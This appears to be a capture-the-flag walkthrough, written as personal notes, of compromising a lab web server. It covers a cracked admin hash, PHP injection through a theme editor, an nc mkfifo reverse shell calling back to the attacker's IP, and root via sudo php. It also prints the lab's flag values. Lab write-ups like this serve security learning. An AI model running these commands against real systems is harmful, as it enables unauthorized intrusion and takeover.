ran gobuster dir -u http://[ip]/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

            <NAME/>
            <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>

            </item>

Username: admin
pwd: d033e22ae348aeb5660fc2140aec35850c4da997
email: admin@[domain].com

entered username password combo into http://[ip]/admin/ , didn't immediately work, but this looks like hashed data, so we'll try to decrypt
ran that through https://hashes.com/en/decrypt/hash -> d033e22ae348aeb5660fc2140aec35850c4da997:admin

Updated Username/Password: admin - admin -> worked logging into /admin
    - Looked through admin panel, found where we can download more plugins, possible avenue is to
    find a compromised plugin that we can download to the server, then crack that plugin?
    - unfortunately downloading a plugin and actually uploading the plugin for use seems broken
    - under the files tab, there's a "Upload files and/or images..." button that doesn't work when clicked
     maybe there's some way I can get that to work and we can upload a little script?

Lets try SSH'ing into the ssh server with our admin password
- ssh admin@[ip]
password: admin
- Permission denied


Scrolling through the website some more, I came across the Theme sub category, and inside it the Theme editor.
    - It looks like Theme editor lets you edit the PHP file of the theme, and just put your own PHP code into the theme file.
    - I'm gonna try to see if I can get remote code execution
    - I placed <?php system('id'); ?> into the text box editor, saved it, and navigated to where themes are stored on the server
    - http://[ip]/theme/Innovation/template.php
        - returns uid=33(www-data) gid=33(www-data) groups=33(www-data) , which means I can get code execution LETS GOOOO
    - Now let's get a reverse shell going.
        - I swapped out the text I replaced with a new command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.155 1234 >/tmp/f
        - Then ran a listener with nc -lvnp 1234 on a terminal, and navigated back to /template.php
            - Connection Acquired
    - Now that I have a reverse shell, I need to get updated TTY access: ran python3 -c 'import pty; pty.spawn("/bin/bash")'

Officially have a reverse shell with good TTY permissions on the remote server, www-data@[domain]

Now it's time for to look around and see if we can do priviledge escalation
    - after shuffling through for a bit, found /home/mrb3n/user.txt > 7002d65b149b0a4d19132a66feed21d8

user flag found, now it's time to try to escalate to root and grab the root flag.

Gonna try to run LinEum.sh on the user, so it's time to try to upload a file from my system to theirs.
    - Opened a python port on the home system with sudo python3 -m http.server 8080
    - Then ran wget http://10.10.14.155:8080/LinEnum.sh
        - Unfortunately I'm getting access denied, so all good


Ran sudo -l, found out the php command is sudo-able with no password
    - Gonna sudo a reverse shell command at 8484 port and see if I can get root access that way
        - after trying a million different commands and almost getting shell access a few times, found on this website: https://gtfobins.github.io/gtfobins/php/
        all sorts of neat stuff you can do with sudo php access
        - CMD="/bin/sh"
        - sudo php -r "system('$CMD');"
        - got me a shell, then used python3 -c 'import pty; pty.spawn("/bin/bash")' to get updated TTY and confirm this actually is root

Navigated to root/root.txt and found the flag: f1fba6e9f71efb2630e6e34da6387842

I WIN
